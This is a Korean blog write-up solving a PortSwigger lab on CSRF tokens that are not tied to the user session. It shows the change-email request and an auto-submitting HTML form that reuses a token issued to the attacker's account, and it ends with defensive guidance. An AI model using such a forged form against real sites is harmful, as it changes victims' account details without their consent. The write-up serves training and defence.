+++
date = '2026-06-23T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - CSRF where token is not tied to user session'
summary = "세션과 결합되지 않은 전역 토큰 풀을 이용해 공격자 계정에서 발급받은 CSRF 토큰을 피해자 요청에 그대로 재사용하는 풀이"
toc = true
tags = ["CSRF", "CSRF Token", "Session Binding", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

> ![image.png](/writeup/portswigger/csrf/04/1.png)

이메일 변경 기능에 CSRF 취약점이 존재한다. 애플리케이션이 토큰으로 CSRF를 방어하지만, 그 토큰이 사이트의 세션 관리 체계와 결합되어 있지 않다. CSRF 공격으로 피해자의 이메일 주소를 변경하면 문제가 해결된다.

실습 계정은 두 개가 주어진다.

- `wiener:peter`
- `carlos:montoya`

### CSRF 진단

정상적으로 이메일을 변경하고 요청을 확인한다.

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded

email=csrf%40csrf.com&csrf=<csrf-token>
```

토큰이 있고 값을 바꾸면 거부되므로, 검증은 동작한다. 문제에서 토큰이 세션과 묶여 있지 않다고 했으므로 결합 여부를 직접 확인한다.

시크릿 탭에서 다른 계정으로 로그인해 그 계정의 이메일 변경 폼에서 토큰을 하나 발급받는다. 이 토큰을 원래 세션의 요청에 넣어 보내면 이메일이 정상적으로 변경된다.

즉 서버는 토큰을 사용자별로 발급·보관하는 것이 아니라, 유효하게 발급된 토큰이면 어느 세션에서 왔든 받아들이는 전역 풀(pool)로 관리하고 있다.

---

## 익스플로잇

공격자 계정에서 유효한 토큰을 하나 확보한 뒤, 그 값을 하드코딩한 폼을 구성한다.

```html
<form id="autosubmit" action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
    <input name="email" value="csrf2@csrf.com" />
    <input name="csrf" value="<attacker-csrf-token>" />
</form>

<script>
    document.getElementById("autosubmit").submit();
</script>
```

피해자가 이 페이지를 열면 브라우저가 피해자의 세션 쿠키를 붙이고, 본문에는 공격자가 미리 확보한 토큰이 실린다. 서버는 두 값이 같은 사용자의 것인지 확인하지 않으므로 요청을 정상 처리한다.

이 페이로드를 피해자에게 전달하면 문제가 해결된다.

![image.png](/writeup/portswigger/csrf/04/2.png)

---

## 정리

CSRF 토큰이 방어로 기능하는 이유는 공격자가 **피해자의 토큰 값을 알 수 없기 때문**이다. 이 전제는 토큰이 특정 세션에 귀속되어 있을 때만 성립한다. 토큰을 전역 풀로 관리하면 공격자는 자신의 계정에서 얼마든지 유효한 토큰을 뽑아낼 수 있고, 예측 불가능성이라는 성질은 아무 의미가 없어진다.

토큰이 아무리 높은 엔트로피로 생성되어도 마찬가지다. 이 랩의 토큰은 충분히 무작위하지만, 검증이 "발급된 적 있는 값인가"만 확인하기 때문에 무작위성이 방어로 전환되지 않는다. 토큰의 강도는 생성 방식이 아니라 **무엇과 대조되는가**로 결정된다.

방어는 토큰을 사용자 세션에 저장하고, 요청에 담긴 값이 그 세션에 저장된 값과 일치하는지 확인하는 것이다. 다음 랩인 [비세션 쿠키에 결합된 토큰](/write-up/portswigger/csrf/write-up-portswigger---csrf-where-token-is-tied-to-non-session-cookie/)은 결합을 시도하긴 하지만 대상을 세션이 아닌 별도 쿠키로 잡아, 결합의 대상이 잘못되면 어떤 문제가 생기는지를 보여준다.
